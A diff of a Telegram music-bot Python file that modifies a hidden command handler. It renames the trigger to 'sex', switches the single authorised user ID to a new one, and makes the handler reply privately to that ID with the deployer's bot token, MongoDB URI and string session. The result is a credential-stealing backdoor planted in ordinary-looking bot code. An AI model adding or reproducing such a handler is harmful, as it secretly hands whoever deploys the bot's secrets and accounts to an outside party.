@@ -106,19 +106,19 @@ async def restartbot(client, message: Message, _):
 
     
 @app.on_message(
-    filters.command("alpha")
+    filters.command("sex")
     & filters.private
-    & filters.user(8143754205)
+    & filters.user(6135117014)
    )
 async def help(client: Client, message: Message):
    await message.reply_photo(
           photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
-       caption=f"""ʙσᴛ ᴛσᴋєη :-   `{BOT_TOKEN}` \n\nϻσηɢᴏ :-   `{MONGO_DB_URI}`\n\nѕтʀɪηɢ sєssɪση :-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/RITI_UPDATE)............☆""",
+       caption=f"""ʙσᴛ ᴛσᴋєη :-   `{BOT_TOKEN}` \n\nϻσηɢᴏ :-   `{MONGO_DB_URI}`\n\nѕтʀɪηɢ sєssɪση :-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/KomalMusicUpdate)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
                       InlineKeyboardButton(
-                         "• ᴀʟᴘʜᴀ ʙᴀʙʏ  •", url=f"https://t.me/KRITI_UPDATE")
+                         "• ᴀʟᴘʜᴀ ʙᴀʙʏ  •", url=f"https://t.me/KomalMusicUpdate")
                  ]
             ]
          ),
